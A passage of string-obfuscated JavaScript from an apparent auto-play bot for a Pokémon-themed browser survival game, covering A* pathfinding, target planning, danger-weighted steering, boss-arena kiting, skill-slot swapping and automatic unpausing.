                    if (span > 120)
                        return null;
                    const traps = trapsNear(W, (p.x + tx) / 2, (p.y + ty) / 2, Math.hypot(tx - p.x, ty - p.y) / 2 + 200);
                    const walk = new Map();
                    const K = (x, y) => (x + 50000) * 100000 + (y + 50000);
                    const ok = (x, y) => {
                        const k = K(x, y);
                        let v = walk.get(k);
                        if (v === undefined) {
                            const cx = x * TS + TS / 2, cy = y * TS + TS / 2;
                            v = Math.abs(x - sx) <= span && Math.abs(y - sy) <= span && W.isFree(cx, cy, Math.min(p.r, TS * 0.45))
                                && !traps.some(t => (cx - t.x) ** 2 + (cy - t.y + 8) ** 2 < 26 * 26);
                            walk.set(k, v);
                        }
                        return v;
                    };
                    const isGoal = (x, y) => Math.max(Math.abs(x - gx), Math.abs(y - gy)) <= goalTol;
                    const hh = (x, y) => { const dx = Math.abs(x - gx), dy = Math.abs(y - gy); return Math.max(dx, dy) + 0.414 * Math.min(dx, dy); };
                    const heap = [], push = n => { heap.push(n); let i = heap.length - 1; while (i) {
                        const j = (i - 1) >> 1;
                        if (heap[j].f <= n.f)
                            break;
                        heap[i] = heap[j];
                        i = j;
                    } heap[i] = n; };
                    const pop = () => { const top = heap[0], last = heap.pop(); if (heap.length) {
                        let i = 0;
                        for (;;) {
                            let c = 2 * i + 1;
                            if (c >= heap.length)
                                break;
                            if (c + 1 < heap.length && heap[c + 1].f < heap[c].f)
                                c++;
                            if (heap[c].f >= last.f)
                                break;
                            heap[i] = heap[c];
                            i = c;
                        }
                        heap[i] = last;
                    } return top; };
                    const g = new Map(), from = new Map();
                    g.set(K(sx, sy), 0);
                    push({ x: sx, y: sy, f: hh(sx, sy) });
                    let end = null, n = 0;
                    while (heap.length && n++ < 8000) {
                        const c = pop(), ck = K(c.x, c.y), cg = g.get(ck);
                        if (isGoal(c.x, c.y)) {
                            end = c;
                            break;
                        }
                        for (let dx = -1; dx <= 1; dx++)
                            for (let dy = -1; dy <= 1; dy++) {
                                if (!dx && !dy)
                                    continue;
                                const nx = c.x + dx, ny = c.y + dy;
                                if (!ok(nx, ny) && !isGoal(nx, ny))
                                    continue;
                                if (dx && dy && (!ok(c.x + dx, c.y) || !ok(c.x, c.y + dy)))
                                    continue;
                                const ng = cg + (dx && dy ? 1.414 : 1), nk = K(nx, ny);
                                if (ng < (g.get(nk) ?? Infinity)) {
                                    g.set(nk, ng);
                                    from.set(nk, ck);
                                    push({ x: nx, y: ny, f: ng + hh(nx, ny) });
                                }
                            }
                    }
                    if (!end)
                        return null;
                    const pts = [];
                    for (let k = K(end.x, end.y); k !== undefined; k = from.get(k)) {
                        const x = Math.floor(k / 100000) - 50000, y = (k % 100000) - 50000;
                        pts.push([x * TS + TS / 2, y * TS + TS / 2]);
                    }
                    pts.reverse();
                    pts[pts.length - 1] = [tx, ty];
                    return { pts, len: g.get(K(end.x, end.y)) * TS + Math.hypot(tx - pts[pts.length - 1][0], ty - pts[pts.length - 1][1]) };
                }
                function waypoint(p, path) {
                    const W = G().World, traps = trapsNear(W, p.x, p.y, 320);
                    const clear = (x, y) => {
                        const d = Math.hypot(x - p.x, y - p.y), n = Math.ceil(d / 8);
                        for (let i = 1; i <= n; i++) {
                            if (d * (1 - i / n) < 26)
                                break;
                            const sx = p.x + (x - p.x) * i / n, sy = p.y + (y - p.y) * i / n;
                            if (!W.isFree(sx, sy, p.r) || traps.some(t => (sx - t.x) ** 2 + (sy - t.y + 8) ** 2 < 23 * 23))
                                return false;
                        }
                        return true;
                    };
                    let near = 0, nd = Infinity;
                    path.pts.forEach(([x, y], i) => { const d = Math.hypot(x - p.x, y - p.y); if (d < nd) {
                        nd = d;
                        near = i;
                    } });
                    path.pts.splice(0, near);
                    let wp = path.pts[0];
                    for (let i = 1; i < Math.min(path.pts.length, 14); i++) {
                        const [x, y] = path.pts[i];
                        if (Math.hypot(x - p.x, y - p.y) > 260 || !clear(x, y))
                            break;
                        wp = path.pts[i];
                    }
                    return { x: wp[0], y: wp[1], offPath: nd };
                }
                function candidates(p, hpPct) {
                    const g = G(), out = [], t = g.Game.st.time, W = g.World;
                    if (hpPct > 0.2)
                        for (const e of g.EnemyMgr.all()) {
                            if (e.dead || e.behavior !== _0xstr(0x1d2))
                                continue;
                            S.seen[e.id] = S.seen[e.id] ?? t;
                            const gold = (e.def && e.def.loot === _0xstr(0x1d3)) || e.dex === 1000;
                            out.push({ key: _0xstr(0x1d4) + e.id, x: e.x, y: e.y, tier: gold ? 5 : 3, value: gold ? 14 : 3, left: 15 - (t - S.seen[e.id]), mode: gold ? _0xstr(0x1d5) : _0xstr(0x1d6), goalTol: 2, chase: true, flee: e.spd || 92 });
                        }
                    const rift = g.Rift && g.Rift.rift;
                    if (rift && !g.Rift.inArena && hpPct > 0.2)
                        out.push({ key: _0xstr(0x1d7), tier: 4, x: rift.x, y: rift.y - 10, value: 12, left: rift.ttl ?? 45, mode: _0xstr(0x1d8), goalTol: 0, chase: true, direct: true });
                    const lost = g.Events && g.Events._dbg && g.Events._dbg();
                    if (lost && hpPct > 0.25 && !(g.Rift && g.Rift.inArena)) {
                        if (lost.state === _0xstr(0x1d9))
                            out.push({ key: _0xstr(0x1da), tier: 3, x: lost.x, y: lost.y, value: 8, left: 90, mode: _0xstr(0x1db), goalTol: 1, chase: true });
                        else
                            out.push({ key: _0xstr(0x1dc), tier: 3, x: lost.tx, y: lost.ty, value: 9, left: 90, mode: _0xstr(0x1dd), goalTol: 0, chase: true, hold: 20, escort: true });
                    }
                    const lt = S.losTarget;
                    if (lt && !lt.dead && !lt.arceus && !(g.Judgment && g.Judgment.active) && S.losBadT > 0.8 && W && W.isFree && W.projectileBlock) {
                        const clearShot = (x, y) => { const d = Math.hypot(lt.x - x, lt.y - y), n = Math.ceil(d / 12); for (let i = 1; i < n; i++)
                            if (W.projectileBlock(x + (lt.x - x) * i / n, y + (lt.y - y) * i / n - (g.LIFT || 0), 4))
                                return false; return true; };
                        const spots = [];
                        for (const r of [140, 220, 300])
                            for (let k = 0; k < 24; k++) {
                                const a = k / 24 * 6.2832, x = lt.x + Math.cos(a) * r, y = lt.y + Math.sin(a) * r;
                                if (W.isFree(x, y, p.r + 4) && clearShot(x, y))
                                    spots.push({ x, y, d: Math.hypot(x - p.x, y - p.y) });
                            }
                        spots.sort((a, b) => a.d - b.d);
                        for (const sp of spots.slice(0, 2))
                            out.push({ key: _0xstr(0x1de) + Math.round(sp.x / 64) + _0xstr(0x1df) + Math.round(sp.y / 64), tier: 1, x: sp.x, y: sp.y, value: 6, left: Infinity, mode: _0xstr(0x1e0), goalTol: 0, chase: true });
                    }
                    if (!(g.Rift && g.Rift.inArena) && W && W.specialsNear)
                        for (const o of W.specialsNear(p.x, p.y, 700)) {
                            if (o.type === _0xstr(0x1e1) && !o.used)
                                out.push({ key: _0xstr(0x1e2) + o.id, tier: 2, x: o.x, y: o.y, value: 5, left: Infinity, mode: _0xstr(0x1e3), goalTol: 1, chase: true });
                            else if (o.type === _0xstr(0x1e4) && hpPct < 0.6 && (o.charge ?? 1) > 0.2)
                                out.push({ key: _0xstr(0x1e5) + o.id, tier: 2, x: o.x, y: o.y - 8, value: 7, left: Infinity, mode: _0xstr(0x1e6), goalTol: 0, hold: 20, until: () => p.hp >= p.maxHp * 0.95 });
                            else if (o.type === _0xstr(0x1e7) && hpPct > 0.5)
                                out.push({ key: _0xstr(0x1e8) + o.id, tier: 2, x: o.x, y: o.y, value: 3, left: Infinity, mode: _0xstr(0x1e9), goalTol: 1, hold: 34 });
                        }
                    return out;
                }
                function plan(p, hpPct) {
                    const t = now(), g = G();
                    const pSpd = (p.baseSpd || 100) * (p.spdMul || 1);
                    const cur = S.plan;
                    const gt = g.Game.st.time;
                    const cands = candidates(p, hpPct).filter(c => !(S.ban[c.key] > gt));
                    const live = cur && cands.find(c => c.key === cur.key);
                    const higher = cur && cands.some(c => c.tier > cur.c.tier && !(S.noGo[c.key] > t));
                    const stale = !live || higher || t - cur.at > 600 || Math.hypot(live.x - cur.c.x, live.y - cur.c.y) > 48 || (cur.path && cur.path.pts.length < 2);
                    if (!stale) {
                        cur.c = Object.assign(cur.c, live, { x: cur.c.x, y: cur.c.y });
                        return cur;
                    }
                    let best = null, bestScore = 0, bestTier = -1;
                    const order = cands.sort((a, b) => (b.tier - a.tier) || (b.value / Math.hypot(b.x - p.x, b.y - p.y) - a.value / Math.hypot(a.x - p.x, a.y - p.y)));
                    for (const c of order) {
                        if (c.tier < bestTier)
                            break;
                        const path = findPath(p, c.x, c.y, c.goalTol);
                        if (!path) {
                            S.noGo[c.key] = t + 1000;
                            continue;
                        }
                        const eta = c.flee ? Math.max(0, path.len - 220) / Math.max(8, pSpd - c.flee) : path.len / pSpd;
                        if (eta > c.left - 1) {
                            S.noGo[c.key] = t + 1000;
                            continue;
                        }
                        const score = c.value / (eta + 4) * (cur && cur.key === c.key ? 1.8 : 1);
                        if (c.tier > bestTier || score > bestScore) {
                            bestTier = c.tier;
                            bestScore = score;
                            best = { key: c.key, c, path, at: t, eta };
                        }
                    }
                    S.plan = best;
                    return best;
                }
                const PICK_W = { xp: 1, xpBig: 3, coin: 2, magnet: 5, bomb: 2.5, ticket: 9, ticket10: 12, item: 9, sphere: 6, candy: 6, heal: 0.4 };
                function pickTarget(p, enemies, hpPct, fear) {
                    const g = G(), W = g.World;
                    const pl = plan(p, hpPct);
                    if (pl) {
                        const c = pl.c;
                        const wp = waypoint(p, pl.path);
                        if (wp.offPath > 3 * (W.TS || 32))
                            pl.at = 0;
                        return { x: wp.x, y: wp.y, fx: c.x, fy: c.y, w: 6, mode: c.mode, chase: c.chase, hold: c.hold, until: c.until, escort: c.escort, direct: c.direct };
                    }
                    const wOf = k => k.kind === _0xstr(0x1ea) ? (hpPct < 0.7 ? 8 : 0.2) : (PICK_W[k.kind] ?? 1);
                    const traps = ((W && W.specialsNear && W.specialsNear(p.x, p.y, 600)) || []).filter(t => t.type === _0xstr(0x1eb));
                    const onTrap = k => traps.some(t => (k.x - t.x) ** 2 + (k.y - t.y + 8) ** 2 < 23 * 23);
                    const crowded = g.Game.st.time > 300 && enemies.length >= 6;
                    const items = g.Pickups.all().filter(k => !k.pulled && !(k.kind === _0xstr(0x1ec) && hpPct >= 0.95) && !onTrap(k)
                        && (!crowded || k.kind === _0xstr(0x1ed) || k.kind.startsWith(_0xstr(0x1ee)) || k.kind === _0xstr(0x1ef) || Math.hypot(k.x - p.x, k.y - p.y) < 220));
                    if (S.orbGoal) {
                        let rest = null, rd = 260;
                        for (const k of items) {
                            if (Math.abs(k.x - S.orbGoal.x) > 110 || Math.abs(k.y - S.orbGoal.y) > 110)
                                continue;
                            const d = Math.hypot(k.x - p.x, k.y - p.y);
                            if (d < rd) {
                                rd = d;
                                rest = k;
                            }
                        }
                        if (rest)
                            return (S.orbGoal = { x: rest.x, y: rest.y, w: 2, mode: _0xstr(0x1f0), orb: true });
                    }
                    let best = null, bestS = 0;
                    for (const k of items) {
                        const d = Math.hypot(k.x - p.x, k.y - p.y);
                        let cluster = 0;
                        for (const o of items)
                            if (Math.abs(o.x - k.x) < 90 && Math.abs(o.y - k.y) < 90)
                                cluster += wOf(o);
                        let crowd = 0;
                        if (hpPct < 0.6)
                            for (const e of enemies)
                                if (!e.dead && Math.abs(e.x - k.x) < 70 && Math.abs(e.y - k.y) < 70)
                                    crowd += e.boss ? 5 : 1;
                        let s = cluster / (d + 40) / (1 + crowd * 0.35 * fear);
                        if (S.orbGoal && Math.abs(k.x - S.orbGoal.x) < 90 && Math.abs(k.y - S.orbGoal.y) < 90)
                            s *= 1.6;
                        if (s > bestS) {
                            bestS = s;
                            best = { x: k.x, y: k.y, w: 2, mode: _0xstr(0x1f1), orb: true };
                        }
                    }
                    S.orbGoal = best;
                    if (best)
                        return best;
                    if (hpPct > 0.5) {
                        let hunt = null, hd = Infinity;
                        for (const e of g.EnemyMgr.all()) {
                            if (e.dead || e.silent)
                                continue;
                            const d = Math.hypot(e.x - p.x, e.y - p.y);
                            if (d < hd) {
                                hd = d;
                                hunt = e;
                            }
                        }
                        if (hunt && hd > 600)
                            return { x: hunt.x, y: hunt.y, w: 0.8, mode: _0xstr(0x1f2) };
                    }
                    return null;
                }
                const DIRS = Array.from({ length: 16 }, (_, i) => [Math.cos(i * Math.PI / 8), Math.sin(i * Math.PI / 8)]);
                function steer() {
                    const g = G(), p = g.Game.player;
                    if (!p || p.dead)
                        return [0, 0];
                    const t = now();
                    const dt = Math.min(0.1, (t - S.lastT) / 1000);
                    S.lastT = t;
                    const gt = g.Game.st.time;
                    const hpPct = p.hp / p.maxHp;
                    let fear = hpPct < 0.35 ? 2.5 : hpPct < 0.6 ? 1 : 0.25;
                    const near = [];
                    for (const e of g.EnemyMgr.all()) {
                        if (e.dead || e.silent || e.behavior === _0xstr(0x1f3))
                            continue;
                        if (Math.abs(e.x - p.x) < 360 && Math.abs(e.y - p.y) < 360)
                            near.push(e);
                    }
                    const shots = g.Projectiles.all().filter(s => !s.friendly && Math.abs(s.x - p.x) < 300 && Math.abs(s.y - p.y) < 300);
                    const zones = hazards();
                    const J = g.Judgment;
                    const unitPx = (g.Tiles && g.Sprites) ? g.Tiles.T * g.Sprites.PX : 32;
                    const judging = !!(J && J.active);
                    if (!judging)
                        S.jCenter = null;
                    else {
                        const wa = g.World && g.World.arena;
                        if (wa && wa.type === _0xstr(0x1f4))
                            S.jCenter = { x: wa.tx * unitPx + unitPx / 2, y: wa.ty * unitPx + unitPx / 2 };
                        else if (!S.jCenter)
                            S.jCenter = { x: p.x, y: p.y - 3 * unitPx };
                    }
                    const arceus = judging ? g.EnemyMgr.all().find(e => e.arceus) : null;
                    let target = pickTarget(p, near, hpPct, fear);
                    if (target && target.escort)
                        fear = Math.max(fear, 1);
                    if (judging && target && !(target.orb && Math.hypot(target.x - p.x, target.y - p.y) < 140 && (!arceus || Math.hypot(arceus.x - p.x, arceus.y - p.y) > 320)))
                        target = null;
                    S.target = target;
                    const arena = (g.Rift && g.Rift.inArena) || judging;
                    const W = g.World;
                    const pSpd = (p.baseSpd || 100) * (p.spdMul || 1);
                    const bigFear = Math.max(1, fear);
                    const danger = (x, y, tAhead) => {
                        let c = 0, big = 0;
                        for (const e of near) {
                            const spd = e.arceus ? pSpd * 1.2 : e.spd || 40, fast = Math.min(2, spd / pSpd);
                            const d = Math.hypot(x - e.x, y - e.y) - (e.r || 10) - p.r - spd * tAhead * 0.8;
                            const reach = (e.arceus ? 140 : e.boss ? 90 : 35) + 45 * fast;
                            const w = e.arceus ? 8 : (e.boss ? 4 : 1) * Math.min(3, Math.max(0.5, (e.dmg || 10) / (p.maxHp * 0.12)));
                            const v = w * Math.exp(-Math.max(d, -20) / reach);
                            if (e.boss || e.arceus)
                                big += v;
                            else
                                c += v;
                        }
                        for (const s of shots) {
                            const sx = s.x + (s.vx || 0) * tAhead, sy = s.y + (s.vy || 0) * tAhead;
                            const d = Math.hypot(x - sx, y - sy) - (s.r || 6) - p.r;
                            big += 6 * Math.exp(-Math.max(d, -10) / 30);
                        }
                        for (const z of zones)
                            if (!z.hit && inHazard(z, x, y, p.r))
                                big += 25;
                        return c * fear + big * bigFear;
                    };
                    const free = (x, y) => !W || !W.isFree || W.isFree(x, y, p.r);
                    const traps = ((W && W.specialsNear && W.specialsNear(p.x, p.y, 400)) || []).filter(o => o.type === _0xstr(0x1f5));
                    const onTrap = (x, y) => traps.some(o => (x - o.x) ** 2 + (y - o.y + 8) ** 2 < 23 * 23);
                    const pathLen = (dx, dy, step) => {
                        for (let k = 12; k <= step; k += 12) {
                            const x = p.x + dx * k, y = p.y + dy * k;
                            if (!free(x, y) || onTrap(x, y))
                                return k - 12;
                        }
                        return step;
                    };
                    const RING = DIRS.filter((_, i) => i % 2 === 0);
                    const cramped = (x, y) => { let n = 0; for (const [rx, ry] of RING)
                        if (!free(x + rx * 45, y + ry * 45))
                            n++; return n; };
                    const los = (x1, y1, x2, y2) => {
                        if (!W || !W.projectileBlock)
                            return true;
                        const d = Math.hypot(x2 - x1, y2 - y1), n = Math.ceil(d / 12);
                        for (let i = 1; i < n; i++)
                            if (W.projectileBlock(x1 + (x2 - x1) * i / n, y1 + (y2 - y1) * i / n - (g.LIFT || 0), 4))
                                return false;
                        return true;
                    };
                    const aimTargets = near.slice().sort((a, b) => Math.hypot(a.x - p.x, a.y - p.y) - Math.hypot(b.x - p.x, b.y - p.y)).slice(0, 10);
                    const lockedFrom = (x, y) => {
                        let boss = null, nearest = null, nd = 520;
                        for (const e of aimTargets) {
                            if (e.arceus)
                                continue;
                            const d = Math.hypot(e.x - x, e.y - y);
                            if (e.boss && d < 330)
                                boss = e;
                            if (d < nd) {
                                nd = d;
                                nearest = e;
                            }
                        }
                        return boss || nearest;
                    };
                    const blockedShot = (x, y) => { const e = lockedFrom(x, y); return e && !los(x, y, e.x, e.y) ? 1 : 0; };
                    S.losTarget = lockedFrom(p.x, p.y);
                    S.losBadT = blockedShot(p.x, p.y) ? (S.losBadT || 0) + dt : 0;
                    if (S.losBadT === 0 && S.plan && S.plan.key.startsWith(_0xstr(0x1f6)))
                        S.plan = null;
                    const losW = S.losBadT > 0.6 ? 2.5 : 1.2;
                    const here = danger(p.x, p.y, 0);
                    let kite = null;
                    const ar = judging ? (S.jCenter && { x: S.jCenter.x, y: S.jCenter.y, r: 24, judge: true }) : arena && g.Rift.arena;
                    if (ar) {
                        const boss = ar.judge ? arceus : (ar.bossId && g.EnemyMgr.get && g.EnemyMgr.get(ar.bossId)) || near.find(e => e.boss);
                        const edge = Math.max(80, (ar.r - 1.4) * unitPx - p.r - 6);
                        const ring = edge * (ar.judge ? 0.55 : 0.82);
                        const px0 = p.x - ar.x, py0 = p.y - ar.y, pr = Math.hypot(px0, py0) || 1;
                        const pa = Math.atan2(py0, px0);
                        let kx = 0, ky = 0, w = 1.8;
                        if (boss && !boss.dead) {
                            const ba = Math.atan2(boss.y - ar.y, boss.x - ar.x);
                            let delta = pa - ba;
                            while (delta > Math.PI)
                                delta -= 2 * Math.PI;
                            while (delta < -Math.PI)
                                delta += 2 * Math.PI;
                            if (Math.abs(delta) < Math.PI * 0.85)
                                S.spin = delta >= 0 ? 1 : -1;
                            const aim = pa + S.spin * 0.55;
                            kx = ar.x + Math.cos(aim) * ring - p.x;
                            ky = ar.y + Math.sin(aim) * ring - p.y;
                            const bd = Math.hypot(p.x - boss.x, p.y - boss.y);
                            if (bd < (ar.judge ? 240 : 180)) {
                                const ux = (p.x - boss.x) / (bd || 1), uy = (p.y - boss.y) / (bd || 1);
                                const kl0 = Math.hypot(kx, ky) || 1;
                                kx = kx / kl0 + ux * 1.5;
                                ky = ky / kl0 + uy * 1.5;
                                w = 3.5;
                            }
                        }
                        else if (!ar.judge) {
                            kx = ar.x - p.x;
                            ky = ar.y - p.y;
                            if (pr < 40)
                                kx = ky = 0;
                        }
                        const kl = Math.hypot(kx, ky);
                        if (kl > 0.01)
                            kite = { x: kx / kl, y: ky / kl, w };
                    }
                    else if ((!target || here > 2) && !(target && target.hold) && !(target && target.chase && here < 4)) {
                        const R = 380;
                        let c = S.loopC;
                        const v = S.out || [1, 0];
                        const anchor = () => ({ x: p.x - R * S.spin * v[1], y: p.y + R * S.spin * v[0] });
                        if (!c || Math.abs(Math.hypot(p.x - c.x, p.y - c.y) - R) > R * 0.6)
                            c = S.loopC = anchor();
                        let rx = p.x - c.x, ry = p.y - c.y;
                        const rd = Math.hypot(rx, ry) || 1;
                        rx /= rd;
                        ry /= rd;
                        const ang = Math.atan2(ry, rx) + S.spin * 0.5;
                        let kx = c.x + Math.cos(ang) * R - p.x, ky = c.y + Math.sin(ang) * R - p.y;
                        const kl = Math.hypot(kx, ky) || 1;
                        kx /= kl;
                        ky /= kl;
                        kite = { x: kx, y: ky, w: 1.6 + Math.min(1.5, here * 0.4) };
                        S.spinBlockT = pathLen(kx, ky, 90) < 60 ? S.spinBlockT + dt : 0;
                        if (S.spinBlockT > 0.6) {
                            S.spin *= -1;
                            S.spinBlockT = 0;
                            S.loopC = null;
                        }
                    }
                    const hazardHits = (dx, dy) => {
                        if (!zones.length)
                            return 0;
                        const reach = pathLen(dx, dy, 240);
                        let hit = 0;
                        for (const z of zones) {
                            if (z.hit)
                                continue;
                            const tr = Math.max(0, (z.delay || 0) - (z.t || 0));
                            const t2 = Math.min(tr * pSpd * 0.9, reach);
                            if (inHazard(z, p.x + dx * t2, p.y + dy * t2, p.r + 4))
                                hit += 1;
                        }
                        return hit * 30 * bigFear;
                    };
                    const cost = DIRS.map(([dx, dy]) => {
                        let bestStep = Infinity;
                        for (const step of [55, 120, 200]) {
                            const reach = pathLen(dx, dy, step);
                            if (reach < 12)
                                continue;
                            const x = p.x + dx * reach, y = p.y + dy * reach;
                            let c = danger(x, y, reach / pSpd);
                            c += (reach < step ? 6 + 6 * (1 - reach / step) : 0) + cramped(x, y) * 1.2;
                            if (target) {
                                const before = Math.hypot(target.x - p.x, target.y - p.y), after = Math.hypot(target.x - x, target.y - y);
                                c -= target.w * (before - after) / step;
                            }
                            bestStep = Math.min(bestStep, c);
                        }
                        if (bestStep === Infinity)
                            return Infinity;
                        bestStep += hazardHits(dx, dy);
                        bestStep += losW * blockedShot(p.x + dx * 90, p.y + dy * 90);
                        if (kite)
                            bestStep -= kite.w * (dx * kite.x + dy * kite.y);
                        else if (!target && !arena)
                            bestStep -= 0.3 * (dx * Math.cos(S.wanderA) + dy * Math.sin(S.wanderA));
                        return bestStep;
                    });
                    const sm = cost.map((c, i) => c === Infinity ? Infinity : 0.5 * c + 0.25 * (Math.min(cost[(i + 15) % 16], c + 3) + Math.min(cost[(i + 1) % 16], c + 3)));
                    let bi = -1;
                    for (let i = 0; i < 16; i++)
                        if (sm[i] < Infinity && (bi < 0 || sm[i] < sm[bi]))
                            bi = i;
                    if (!target)
                        S.wanderA += dt * 0.35;
                    S.mode = judging ? (here > 2 ? _0xstr(0x1f7) : _0xstr(0x1f8)) : arena ? (here > 2 ? _0xstr(0x1f9) : _0xstr(0x1fa)) : here > 2 ? _0xstr(0x1fb) : target && (target.chase || target.hold) ? target.mode : kite ? _0xstr(0x1fc) : target ? target.mode : _0xstr(0x1fd);
                    const escape = () => {
                        let bd = null, bs = -Infinity;
                        for (const [dx, dy] of DIRS) {
                            let r = pathLen(dx, dy, 120);
                            if (r < 12)
                                for (let t2 = 6; t2 <= 40; t2 += 6) {
                                    if (W && W.isFree && !W.isFree(p.x + dx * t2, p.y + dy * t2, p.r * 0.5))
                                        break;
                                    r = t2 * 0.5;
                                }
                            const sc = r - cramped(p.x + dx * r, p.y + dy * r) * 15 - danger(p.x + dx * r, p.y + dy * r, 0.5) * 20;
                            if (sc > bs) {
                                bs = sc;
                                bd = [dx, dy];
                            }
                        }
                        return bd || DIRS[(Math.random() * 16) | 0];
                    };
                    if (bi < 0) {
                        S.unstickT = Math.max(S.unstickT, 0.4);
                        S.unstickDir = escape();
                        bi = 0;
                    }
                    let urgent = 0;
                    for (const sh of shots)
                        urgent += 6 * Math.exp(-Math.max(Math.hypot(p.x - sh.x, p.y - sh.y) - (sh.r || 6) - p.r, -10) / 30);
                    for (const z of zones)
                        if (!z.hit && inHazard(z, p.x, p.y, p.r + 4))
                            urgent += 25;
                    const emergency = urgent > 4;
                    S.holdT -= dt;
                    const keep = S.dirIdx >= 0 && sm[S.dirIdx] < Infinity && (emergency ? sm[S.dirIdx] - sm[bi] < 3 && S.holdT > 0 : S.holdT > 0 || sm[S.dirIdx] - sm[bi] < 0.6);
                    if (keep)
                        bi = S.dirIdx;
                    else if (bi !== S.dirIdx) {
                        S.dirIdx = bi;
                        S.holdT = emergency ? 0.25 : 0.15;
                    }
                    let best = DIRS[bi];
                    S.holding = false;
                    if (target && target.hold && here < 4) {
                        const d = Math.hypot((target.fx ?? target.x) - p.x, (target.fy ?? target.y) - p.y);
                        if (d < target.hold && !(target.until && target.until())) {
                            const key = S.plan && S.plan.key;
                            if (S.holdKey !== key) {
                                S.holdKey = key;
                                S.holdSince = gt;
                            }
                            const limit = target.escort ? 20 : target.mode === _0xstr(0x1fe) ? 6 : 10;
                            if (gt - S.holdSince < limit) {
                                S.holding = true;
                                S.wd = null;
                                return [0, 0];
                            }
                            if (key) {
                                S.ban[key] = gt + 30;
                                S.plan = null;
                                log(_0xstr(0x1ff), key);
                            }
                        }
                    }
                    if (target && target.fx !== undefined && here < 2) {
                        const dx = target.x - p.x, dy = target.y - p.y, d = Math.hypot(dx, dy) || 1;
                        const safe = !zones.some(z => !z.hit && inHazard(z, p.x + dx / d * 30, p.y + dy / d * 30, p.r));
                        if (safe && d > 4)
                            best = [dx / d, dy / d];
                    }
                    if (S.lastPos) {
                        const moved = Math.hypot(p.x - S.lastPos[0], p.y - S.lastPos[1]);
                        S.stuckT = moved < 0.3 ? S.stuckT + dt : 0;
                    }
                    S.lastPos = [p.x, p.y];
                    if (!S.wd || S.holding)
                        S.wd = { x: p.x, y: p.y, t: gt };
                    else if (gt - S.wd.t > 3) {
                        if (Math.hypot(p.x - S.wd.x, p.y - S.wd.y) < 10) {
                            log(_0xstr(0x200));
                            if (S.plan) {
                                S.ban[S.plan.key] = gt + 15;
                                S.plan = null;
                            }
                            S.loopC = null;
                            S.unstickT = 0.8;
                            S.unstickDir = escape();
                        }
                        S.wd = { x: p.x, y: p.y, t: gt };
                    }
                    if (S.stuckT > 0.4) {
                        S.stuckT = 0;
                        S.unstickT = 0.5;
                        S.unstickDir = escape();
                    }
                    if (S.unstickT > 0) {
                        S.unstickT -= dt;
                        best = S.unstickDir;
                    }
                    const reversing = S.out[0] * best[0] + S.out[1] * best[1] < -0.2;
                    const a = emergency || reversing || S.unstickT > 0 ? 1 : Math.min(1, dt * 12);
                    const ox = S.out[0] * (1 - a) + best[0] * a, oy = S.out[1] * (1 - a) + best[1] * a;
                    const ol = Math.hypot(ox, oy) || 1;
                    S.out = [ox / ol, oy / ol];
                    if (!isFinite(S.out[0]) || !isFinite(S.out[1])) {
                        S.out = escape();
                        S.loopC = null;
                        S.plan = null;
                    }
                    return S.out;
                }
                const holdSlot = () => { const g = G(), p = g && g.Game && g.Game.player; return !!(p && p.moves && p.moves.some(m => m.kind === _0xstr(0x201))); };
                const groupScore = grp => {
                    let dmg = 0, buff = 0, orbit = 0;
                    for (const m of grp) {
                        if (m.kind === _0xstr(0x202))
                            buff++;
                        else
                            dmg += 10 + (m.lvl || 1) + (m.evolved ? 5 : 0);
                        if (m.kind === _0xstr(0x203))
                            orbit++;
                    }
                    return dmg ? dmg + buff * 6 + orbit * 8 : 0;
                };
                function tick() {
                    install();
                    const g = G(), p = g && g.Game && g.Game.player;
                    if (!h.state || !h.state.on || !p)
                        return;
                    const t = now();
                    autoResume(g, t);
                    if (p.dead || g.Game.state !== _0xstr(0x204))
                        return;
                    if (!h.CFG.swapSkills) {
                        if (S.slotOf !== p || S.mySlot >= p.slots.length || t - window.__psbotUserInput < 1500) {
                            S.slotOf = p;
                            S.mySlot = p.active;
                        }
                        else if (p.active !== S.mySlot) {
                            log(_0xstr(0x205), S.mySlot + 1, _0xstr(0x206));
                            p.setActive(S.mySlot);
                        }
                    }
                    else
                        S.slotOf = null;
                    if (h.CFG.swapSkills && holdSlot() && t - S.lastSlotCheck > 600 && p.slots.length > 1 && !(p.hasItem && p.hasItem(_0xstr(0x207)))) {
                        S.lastSlotCheck = t;
                        let best = p.active, bs = groupScore(p.slots[p.active] || []);
                        p.slots.forEach((grp, i) => { const s = groupScore(grp); if (s > bs + 0.5) {
                            bs = s;
                            best = i;
                        } });
                        if (best !== p.active)
                            p.setActive(best);
                    }
                    if (g.Orbs && p.orbs && t - S.lastOrb > 1500) {
                        let around = 0;
                        for (const e of g.EnemyMgr.all())
                            if (!e.dead && e.behavior !== _0xstr(0x208) && Math.hypot(e.x - p.x, e.y - p.y) < 150)
                                around++;
                        const low = p.hp / p.maxHp < 0.5, danger = low || around >= 6, fight = around >= 4;
                        const boss = (g.EnemyMgr.bossAlive && g.EnemyMgr.bossAlive()) || (g.Judgment && g.Judgment.active);
                        const i = p.orbs.findIndex(o => {
                            const kind = o && g.Orbs.BY && g.Orbs.BY[o.id] && g.Orbs.BY[o.id].kind, full = o && (o.n || 1) >= (g.Orbs.STACK || 3);
                            if (kind === _0xstr(0x209))
                                return danger || (full && fight);
                            if (kind === _0xstr(0x20a))
                                return boss || (o.id === _0xstr(0x20b) && low) || (full && (fight || o.id === _0xstr(0x20c)));
                            return false;
                        });
                        if (i >= 0) {
                            const id = p.orbs[i].id;
                            g.Orbs.use(p, i);
                            S.lastOrb = t;
                            log(_0xstr(0x20d), id);
                        }
                    }
                }
                function autoResume(g, t) {
                    const st = g.Game.state;
                    if (st === _0xstr(0x20e)) {
                        if (t - window.__psbotUserPause > 1000)
                            window.__psbotUserPause = 0;
                        S.pausedAt = 0;
                        return;
                    }
                    if (st !== _0xstr(0x20f) || window.__psbotUserPause || document.visibilityState !== _0xstr(0x210) || !g.Game.togglePause) {
                        S.pausedAt = 0;
                        return;
                    }
                    if (!S.pausedAt)
                        S.pausedAt = t;
                    else if (t - S.pausedAt > 1500) {
                        S.pausedAt = 0;
                        log(_0xstr(0x211));
                        g.Game.togglePause();
                    }
                }
                function card(i) {
                    const g = G(), p = g && g.Game && g.Game.player, c = (window.__psbotOffer || [])[i];
                    if (!p || !c || !c.key)
                        return null;
                    const [type, ...rest] = String(c.key).split(_0xstr(0x212));
                    return { type, id: rest.join(_0xstr(0x213)), evoNow: type === _0xstr(0x214) && c.color === _0xstr(0x215) };
                }
                const WEATHER_OF = { drizzle: _0xstr(0x216), drought: _0xstr(0x217), 'sand-stream': _0xstr(0x218), 'snow-warning': _0xstr(0x219) };
